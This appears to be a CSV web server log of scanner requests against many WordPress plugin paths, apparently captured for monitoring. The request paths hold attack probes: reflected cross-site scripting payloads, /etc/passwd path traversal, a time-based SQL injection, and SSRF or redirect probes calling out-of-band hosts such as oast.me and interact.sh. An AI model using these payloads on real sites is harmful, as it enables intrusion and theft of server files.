"ip","time","path","useragent","source"
"172.70.208.129","2025-09-08T00:21:56Z","/wp-content/plugins/crm-perks-forms/templates/sample_file.php?FirstName=<img%20src%20onerror=alert(document.domain)>&LastName=<img%20src%20onerror=alert(document.domain)>&%20Company=<img%20src%20onerror=alert(document.domain)>","Mozilla/5.0 (Fedora; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0","plugin_php"
"172.68.242.107","2025-09-08T00:22:41Z","/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php?mla_stream_file=ftp://d2urtvpdpd8l0ptk7k6gwpdqz5f7jye6f.oast.online/patrowl.svg","Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","plugin_php"
"172.70.189.103","2025-09-08T00:22:56Z","/wp-content/plugins/wp-automatic/inc/csv.php","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36","plugin_php"
"162.158.163.123","2025-09-08T00:23:28Z","/wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/upload/php/index.php","Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/106.0 Safari/537.36","plugin_php"
"172.70.208.128","2025-09-08T00:23:29Z","/wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=CTLoBAMEZxzUtBje&ticket=ei6YOJpONAjUXxjg&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_r9WOT884vwfsjkhaIsxYr4sBIvTouaQJ","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1","plugin_php"
"172.70.189.103","2025-09-08T00:23:38Z","/wp-content/plugins/simple-file-list/ee-upload-engine.php","Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0 Safari/537.36","plugin_php"
"172.71.124.225","2025-09-08T00:23:38Z","/wp-content/plugins/simple-file-list/ee-file-engine.php","Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15","plugin_php"
"172.70.208.138","2025-09-08T00:24:51Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.163.123","2025-09-08T00:29:43Z","/wp-content/plugins/ait-csv-import-export/admin/upload-handler.php","Mozilla/5.0 (Macintosh: Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15","plugin_php"
"162.158.106.34","2025-09-08T00:29:43Z","/wp-content/plugins/music-store/ms-core/ms-submit.php","Mozilla/5.0 (SS; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0","plugin_php"
"172.70.189.103","2025-09-08T00:29:46Z","/wp-content/plugins/photoblocks-grid-gallery/admin/partials/photoblocks-edit.php?id=%22%3E%3Csvg/onload=alert(document.domain)%3E","Mozilla/5.0 (ZZ; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0","plugin_php"
"172.71.81.164","2025-09-08T00:29:47Z","/wp-content/plugins/simple-file-list/ee-upload-engine.php","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF","plugin_php"
"162.158.88.56","2025-09-08T00:29:48Z","/wp-content/plugins/simple-file-list/ee-file-engine.php","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Safari/605.1.15","plugin_php"
"162.158.163.124","2025-09-08T00:29:55Z","/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5202%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%286%29%29%29yRVR%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27dwQZ%27%2F%2A%2A%2FLIKE%2F%2A%2A%2F%27dwQZ","Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","plugin_php"
"172.70.92.233","2025-09-08T00:29:57Z","/wp-content/plugins/ellipsis-human-presence-technology/inc/protected-forms-table.php?page=%22%20%3E%3Cscript%3Ealert(document.location)%3C/script%3E","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0","plugin_php"
"172.71.124.225","2025-09-08T00:29:58Z","/wp-content/plugins/gallery-plugin/upload/php.php","Mozilla/5.0 (Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0","plugin_php"
"104.23.175.214","2025-09-08T00:30:00Z","/wp-content/plugins/portrait-archiv-shop/js/imageDetails.php?pDetails=);});%3C/script%3E%3Cscript%3Ealert(document.location)%3C/script%3E","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15","plugin_php"
"172.71.124.224","2025-09-08T00:30:00Z","/wp-content/plugins/qwiz-online-quizzes-and-flashcards/registration_complete.php?qname=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0.1 Safari/605.1.15","plugin_php"
"172.69.176.54","2025-09-08T00:30:02Z","/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/exportAjax.php","Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36","plugin_php"
"172.68.164.60","2025-09-08T00:30:22Z","/wp-content/plugins/smart-manager-for-wp-e-commerce/sm/woo-json.php","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15","plugin_php"
"104.23.175.214","2025-09-08T00:31:00Z","/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Safari/605.1.15","plugin_php"
"172.71.124.224","2025-09-08T00:31:14Z","/wp-content/plugins/hmapsprem/views/dashboard/index.php?p=/wp-content/plugins/hmapsprem/foo%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15","plugin_php"
"172.71.81.164","2025-09-08T00:31:35Z","/wp-content/plugins/admin-word-count-column/download-csv.php?path=../../../../../../../../../../../../etc/passwd\x5C0","Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3) AppleWebKit/614.31.14 (KHTML, like Gecko) Version/17.0.96 Safari/614.31.14","plugin_php"
"172.70.143.194","2025-09-08T00:31:41Z","/wp-content/plugins/issuu-panel/menu/documento/requests/ajax-docs.php?abspath=%2Fetc%2Fpasswd","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36","plugin_php"
"162.158.190.88","2025-09-08T00:32:17Z","/wp-content/plugins/avchat-3/index_popup.php?movie_param=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&FB_appId=FB_appId%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E","Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/108.0 Safari/537.36","plugin_php"
"162.158.108.132","2025-09-08T00:32:24Z","/wp-content/plugins/w3-total-cache/pub/minify.php?file=yygpKbDS1y9Ky9TLSy0uLi3Wyy9KB3NLKkqUM4CyxUDpxKzECr30_Pz0nNTEgsxiveT8XAA.css","Mozilla/5.0 (Debian; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0","plugin_php"
"172.70.208.129","2025-09-08T00:32:38Z","/wp-content/plugins/wordfence/lib/wordfenceClass.php?file=/../../../../../../etc/passwd","Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36","plugin_php"
"104.23.175.214","2025-09-08T00:33:05Z","/wp-content/plugins/profile-builder/assets/misc/fallback-page.php?site_url=javascript:alert(document.domain);&message=Not+Found&site_name=404","Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15","plugin_php"
"172.68.164.61","2025-09-08T00:33:12Z","/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=tout","Mozilla/5.0 (SS; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0","plugin_php"
"162.158.106.34","2025-09-08T00:33:29Z","/wp-content/plugins/base64-encoderdecoder/base64-decode.php?string=PHNjcmlwdD5hbGVydCgiZG9jdW1lbnQuZG9tYWluIik8L3NjcmlwdD4=","Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15","plugin_php"
"172.69.176.55","2025-09-08T00:33:31Z","/wp-content/plugins/user-meta/views/debug.php","Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36","plugin_php"
"162.158.163.124","2025-09-08T00:33:42Z","/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=/etc/passwd","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0","plugin_php"
"172.71.124.225","2025-09-08T00:33:43Z","/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0","plugin_php"
"162.158.108.44","2025-09-08T00:33:43Z","/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd","Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36","plugin_php"
"172.70.143.194","2025-09-08T00:34:51Z","/wp-content/plugins/count-per-day/download.php?n=1&f=/etc/passwd","Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36","plugin_php"
"162.158.108.45","2025-09-08T00:35:38Z","/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd","Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36","plugin_php"
"172.70.92.232","2025-09-08T00:37:43Z","/wp-content/plugins/knr-author-list-widget/knrAuthorListCustomSortSave.php?listItem[]=<script>alert(document.domain)</script>","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8","plugin_php"
"172.70.189.104","2025-09-08T00:38:42Z","/wp-content/plugins/cab-fare-calculator/tblight.php?controller=../../../../../../../../../../../etc/passwd%00&action=1&ajax=1","Mozilla/5.0 (ZZ; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0","plugin_php"
"172.71.81.164","2025-09-08T00:38:58Z","/wp-content/plugins/mypixs/mypixs/downloadpage.php?url=/etc/passwd","Mozilla/5.0 (CentOS; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0","plugin_php"
"172.71.124.225","2025-09-08T00:39:00Z","/wp-content/plugins/google-listings-and-ads/vendor/googleads/google-ads-php/scripts/print_php_information.php","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36","plugin_php"
"172.69.176.54","2025-09-08T00:39:42Z","/wp-content/plugins/zip-attachments/download.php?za_file=../../../../../etc/passwd&za_filename=passwd","Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36","plugin_php"
"172.69.176.55","2025-09-08T00:39:51Z","/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://</script><svg/onload=alert(%2732Nes7y7a00Ss1qSf0BMHpeJYF6%27)>","Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36","plugin_php"
"108.162.226.13","2025-09-08T00:39:51Z","/wp-content/plugins/marmoset-viewer/mviewer.php?id=1+http://a.com%27);alert(/32Nes7y7a00Ss1qSf0BMHpeJYF6/);marmoset.embed(%27a","Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36","plugin_php"
"172.70.143.194","2025-09-08T00:40:07Z","/wp-content/plugins/podcast-channels/getid3/demos/demo.write.php?Filename=Filename%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E","Mozilla/5.0 (Fedora; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0","plugin_php"
"172.69.176.54","2025-09-08T00:41:27Z","/wp-content/plugins/wpb-show-core/modules/jplayer_new/jplayer_twitter_ver_1.php?audioPlayerOption=1&fileList[0][title]=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E","Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36","plugin_php"
"172.69.176.54","2025-09-08T00:41:41Z","/wp-content/plugins/socialfit/popup.php?service=googleplus&msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E","Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","plugin_php"
"172.68.164.60","2025-09-08T00:41:46Z","/wp-content/plugins/tera-charts/charts/zoomabletreemap.php?fn=../../../../../etc/passwd","Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15","plugin_php"
"162.158.190.87","2025-09-08T00:42:10Z","/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.7.19","plugin_php"
"172.70.189.104","2025-09-08T00:43:22Z","/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../etc/passwd","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Safari/605.1.15","plugin_php"
"172.70.143.195","2025-09-08T00:44:20Z","/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=https://interact.sh","Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36","plugin_php"
"172.70.143.195","2025-09-08T00:44:36Z","/wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd","Mozilla/5.0 (CentOS; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0","plugin_php"
"172.68.164.61","2025-09-08T00:45:06Z","/wp-content/plugins/gtranslate/url_addon/gtranslate.php?glang=en&gurl=/oast.me","Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36","plugin_php"
"172.69.176.55","2025-09-08T00:45:59Z","/wp-content/plugins/sagepay-server-gateway-for-woocommerce/includes/pages/redirect.php?page=</script>\x22><script>alert(document.domain)</script>","Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","plugin_php"
"172.70.208.129","2025-09-08T00:46:30Z","/wp-content/plugins/blogroll-fun/blogroll.php?k=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E","Mozilla/5.0 (Windows NT 11.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/125.0 Safari/537.36","plugin_php"
"172.69.176.55","2025-09-08T00:46:40Z","/wp-content/plugins/pdf-generator-for-wp/package/lib/dompdf/vendor/dompdf/dompdf/I18N/Arabic/Examples/Query.php?keyword=\x22><script>alert(document.domain)</script>","Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15","plugin_php"
"104.23.175.214","2025-09-08T00:47:08Z","/wp-content/plugins/athlon-manage-calameo-publications/thickbox_content.php?attachment_id=id%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%26","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0","plugin_php"
"172.70.208.129","2025-09-08T00:47:54Z","/wp-content/plugins/members-list/admin/view/user.php?page=%22%3E%3Cimg%20src%20onerror=alert(document.domain)%20x","Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","plugin_php"
"172.71.81.164","2025-09-08T00:48:32Z","/wp-content/plugins/wordpress-toolbar/toolbar.php?wptbto=https://oast.me&wptbhash=acme","Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36","plugin_php"
"172.70.208.129","2025-09-08T00:48:38Z","/wp-content/plugins/wp-swimteam/include/user/download.php?file=/etc/passwd&filename=/etc/passwd&contenttype=text/html&transient=1&abspath=/usr/share/wordpress","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0","plugin_php"
"162.158.108.44","2025-09-08T00:49:24Z","/wp-content/plugins/gwyns-imagemap-selector/popup.php?id=1&class=%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1","plugin_php"
"162.158.108.44","2025-09-08T00:49:25Z","/wp-content/plugins/gwyns-imagemap-selector/popup.php?id=1%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E","Mozilla/5.0 (Macintosh; Intel Mac OS X 12.4) AppleWebKit/619.11 (KHTML, like Gecko) Version/17.3.56 Safari/619.11","plugin_php"
"172.70.143.195","2025-09-08T00:49:35Z","/wp-content/plugins/analytics-insights/tools/oauth2callback.php?state=https://oast.me/%3f&code=x","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.70.143.195","2025-09-08T00:51:02Z","/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://interact.sh/","Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36","plugin_php"
"104.23.175.215","2025-09-08T00:51:21Z","/wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=/etc/passwd","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36","plugin_php"
"162.158.190.87","2025-09-08T00:51:35Z","/wp-content/plugins/wp-custom-pages/wp-download.php?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd","Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36","plugin_php"
"172.69.176.55","2025-09-08T00:51:37Z","/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=/etc/passwd","Mozilla/5.0 (ZZ; Linux i686; rv:135.0) Gecko/20100101 Firefox/135.0","plugin_php"
